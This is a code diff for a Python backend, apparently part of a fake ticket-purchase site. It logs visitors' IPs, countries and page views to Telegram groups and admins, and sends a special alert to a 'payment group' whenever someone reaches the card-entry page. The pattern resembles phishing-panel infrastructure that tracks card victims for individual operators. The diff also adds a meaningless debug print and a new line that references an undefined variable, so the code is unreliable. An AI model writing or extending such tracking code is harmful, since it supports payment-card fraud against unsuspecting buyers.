@@ -340,7 +340,7 @@ def get_page_name(path):
         return "Главная страница"
     elif '/buy-tickets/' in path:
         if '/loading/' in path:
-            return "Ввод карты"
+            return "Оформление заказа (Ввод карты)"
         elif '/code/' in path:
             return "Оформление заказа (код)"
         elif '/quantity/' in path:
@@ -453,7 +453,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
             if important:
                 try:
                     requests.post(url, data=data_group, timeout=1)
-                    
+                    print(f"/n/n/nn/n/n/n/n/n//n/nn/n/n/n//nn//n/nn/n//n/n/n {page}")
                     # Спеціальне логування в платіжну групу для сторінки введення карти
                     if page == "Ввод карты" or "/buy-tickets/loading/" in link:
                         try:
@@ -540,10 +540,11 @@ def send_button_log_to_chat(button_type, ip, page_code, user_name=None, event_in
     except Exception as e:
         print(f"❌ Помилка в send_button_log_to_chat: {e}")
 
-def send_personal_log_to_admin(page_code, ip, country, page_name, action_type="page_view"):
+def send_personal_log_to_admin(page_code, ip, country, action_type="page_view"):
     """
     Надсилає лог в особисті повідомлення з ботом адміну
     """
+    page_name = get_page_name(page) 
     try:
         # Отримуємо admin_id за page_code
         db = sqlite3.connect('users.db')
